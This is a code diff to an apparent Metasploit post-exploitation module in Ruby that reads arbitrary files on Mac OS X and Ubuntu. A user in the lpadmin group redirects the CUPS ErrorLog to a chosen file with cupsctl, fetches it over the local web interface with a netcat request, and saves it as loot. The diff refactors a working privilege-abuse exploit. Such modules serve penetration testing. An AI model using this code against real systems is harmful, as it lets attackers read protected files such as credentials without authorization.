@@ -10,7 +10,6 @@ class Metasploit3 < Msf::Post
 	include Msf::Post::Common
 
 	LP_GROUPS = ['lpadmin', '_lpadmin']
-	CTL_PATH = '/usr/sbin/cupsctl'
 
 	attr_accessor :web_server_was_disabled, :error_log_was_reset
 
@@ -25,7 +24,7 @@ class Metasploit3 < Msf::Post
 				reads the Error Log path and echoes it as plaintext.
 
 				This module is known to work on:
-				
+
 				- Mac OS X < 10.8.4
 				- Ubuntu Desktop <= 12.0.4
 
@@ -64,12 +63,12 @@ class Metasploit3 < Msf::Post
 			print_good "User in lpadmin group, continuing..."
 		end
 
-		if cmd_exec("whereis cupsctl").blank?
+		if ctl_path.blank?
 			print_error "cupsctl binary not found in $PATH"
 			return Msf::Exploit::CheckCode::Safe
 		end
 
-		config_path = cmd_exec("whereis cups-config")
+		config_path = cmd_exec("which cups-config")
 		config_vn = nil
 
 		if not config_path.blank?
@@ -100,43 +99,46 @@ class Metasploit3 < Msf::Post
 			return
 		end
 
-		defaults = cmd_exec(CTL_PATH)
+		defaults = cmd_exec(ctl_path)
 		@web_server_was_disabled = defaults =~ /^WebInterface=no$/i
 
 		# first we set the error log to the path intended
-		puts cmd_exec("#{CTL_PATH} ErrorLog=#{datastore['FILE']}")
-		puts cmd_exec("#{CTL_PATH} WebInterface=yes")
+		cmd_exec("#{ctl_path} ErrorLog=#{datastore['FILE']}")
+		cmd_exec("#{ctl_path} WebInterface=yes")
 		@error_log_was_reset = true
 
 		# now we go grab it from the ErrorLog route
 		file = strip_http_headers(get_request('/admin/log/error_log'))
 
 		# and store as loot
-		l = store_loot('cups_file_read', 'application/octet-stream', session, file,
-		               File.basename(datastore['FILE']))
-		print_good("File #{datastore['FILE']} (#{file.length} bytes) saved to #{l}")
+		f = File.basename(datastore['FILE'])
+		loot = store_loot('cups_file_read', 'application/octet-stream', session, file, f)
+		print_good("File #{datastore['FILE']} (#{file.length} bytes) saved to #{loot}")
 	end
 
 	def cleanup
-		return if @cleanup_up # once!
-		@cleaning_up = true
-
 		print_status "Cleaning up..."
-		rm_f(tmp_path)
-		cmd_exec("#{CTL_PATH} WebInterface=no") if web_server_was_disabled
-		# ErrorLog default is distro-dependent, just unset it
-		cmd_exec("#{CTL_PATH} ErrorLog=") if error_log_was_reset
+		cmd_exec("#{ctl_path} WebInterface=no") if web_server_was_disabled
+		cmd_exec("#{ctl_path} ErrorLog=/var/log/cups/error_log") if error_log_was_reset
 		super
 	end
 
 	private
 
+	def ctl_path; @ctl_path ||= cmd_exec("which cupsctl"); end
 	def strip_http_headers(http); http.gsub(/\A(^.*\r\n)*/, ''); end
-	def tmp_path; @tmp_path ||= "/tmp/#{Rex::Text.rand_text_alpha(12+rand(8))}"; end
 
 	def get_request(uri)
-		rm_f(tmp_path)
-		write_file(tmp_path, "GET #{uri}\n\r\n\r")
-		cmd_exec(['cat', tmp_path, '|', 'nc localhost 631'].join(' '))
+		output = perform_request(uri, 'nc -j localhost 631')
+
+		if output =~ /^usage: nc/
+			output = perform_request(uri, 'nc localhost 631')
+		end
+
+		output
+	end
+
+	def perform_request(uri, nc_str)
+		cmd_exec(['printf', "GET #{uri}\n\r\n\r".inspect, '|', nc_str].join(' '))
 	end
 end
